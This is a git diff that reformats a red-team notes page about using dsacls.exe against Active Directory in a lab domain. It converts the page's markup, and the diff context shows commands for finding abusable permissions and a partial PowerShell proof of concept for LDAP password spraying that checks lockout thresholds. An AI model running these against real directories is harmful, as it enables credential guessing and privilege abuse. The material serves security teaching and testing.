@@ -1,5 +1,6 @@
 ---
 description: Enumeration, living off the land
+tags: [#enumeration]
 ---
 
 # Enumerating AD Object Permissions with dsacls
@@ -12,92 +13,86 @@ Dsacls allows us to display or modify permissions (ACLS) of an Active Directory 
 
 Let's check if user `spot` has any special permissions against user's `spotless` AD object:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
 ```
-{% endcode %}
 
 Nothing useful:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-46-47.png>)
+![[Screenshot from 2019-03-19 22-46-47.png]]
 
 Let's give user spot `Reset Password` and `Change Password` permissions on `spotless` AD object:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-46-04.png>)
+![[Screenshot from 2019-03-19 22-46-04.png]]
 
 ...and try the command again:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-44-21.png>)
+![[Screenshot from 2019-03-19 22-44-21.png]]
 
 ### Full Control
 
 All well known (and abusable) AD object permissions should be sought here. One of them is `FULL CONTROL`:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "full control"
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-54-36.png>)
+![[Screenshot from 2019-03-19 22-54-36.png]]
 
 ### Add/Remove self as member
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" | select-string "spotless"
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-57-50.png>)
+![[Screenshot from 2019-03-19 22-57-50.png]]
 
 ### WriteProperty/ChangeOwnerShip
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-19 23-00-04.png>)
+![[Screenshot from 2019-03-19 23-00-04.png]]
 
 Enumerating AD object permissions this way does not come in a nice format that can be piped between powershell cmd-lets, but it's still something to keep in mind if you do not the ability to use tools like powerview or ActiveDirectory powershell cmdlets or if you are trying to `LOL`.
 
 For more good privileges to be abused:
 
-{% content-ref url="privileged-accounts-and-token-privileges.md" %}
-[privileged-accounts-and-token-privileges.md](privileged-accounts-and-token-privileges.md)
-{% endcontent-ref %}
 
-{% content-ref url="abusing-active-directory-acls-aces.md" %}
+[privileged-accounts-and-token-privileges.md](privileged-accounts-and-token-privileges.md)
+
+
+
 [abusing-active-directory-acls-aces.md](abusing-active-directory-acls-aces.md)
-{% endcontent-ref %}
+
 
 ## Password Spraying Anyone?
 
 As a side note, the `dsacls` binary could be used to do LDAP password spraying as it allows us to bind to an LDAP session with a specified username and password:
 
-{% code title="incorrect logon" %}
 ```csharp
+// incorrect logon
 dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:1234567
 ```
-{% endcode %}
 
-![Logon Failure](<../../.gitbook/assets/Screenshot from 2019-03-19 23-09-12.png>)
+![[Screenshot from 2019-03-19 23-09-12.png|Logon Failure]]
 
-{% code title="correct logon" %}
 ```csharp
+// correct logon
 dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:123456
 ```
-{% endcode %}
 
-![Logon Successful](<../../.gitbook/assets/Screenshot from 2019-03-19 23-09-59.png>)
+![[Screenshot from 2019-03-19 23-09-59.png|Logon Successful]]
 
 ### Dirty POC idea for Password Spraying:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 $domain = ((cmd /c set u)[-3] -split "=")[-1]
 $pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
 $lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
@@ -116,11 +111,10 @@ $password = "123456"
     }
 }
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-20 00-10-10.png>)
+![[Screenshot from 2019-03-20 00-10-10.png]]
 
 ## References
 
-{% embed url="https://support.microsoft.com/en-gb/help/281146/how-to-use-dsacls-exe-in-windows-server-2003-and-windows-2000" %}
+[support.microsoft.com/en-gb/help/281146/how-to-use-dsacls-exe-in-windows-server-2003-and-windows-2000](https://support.microsoft.com/en-gb/help/281146/how-to-use-dsacls-exe-in-windows-server-2003-and-windows-2000)
 
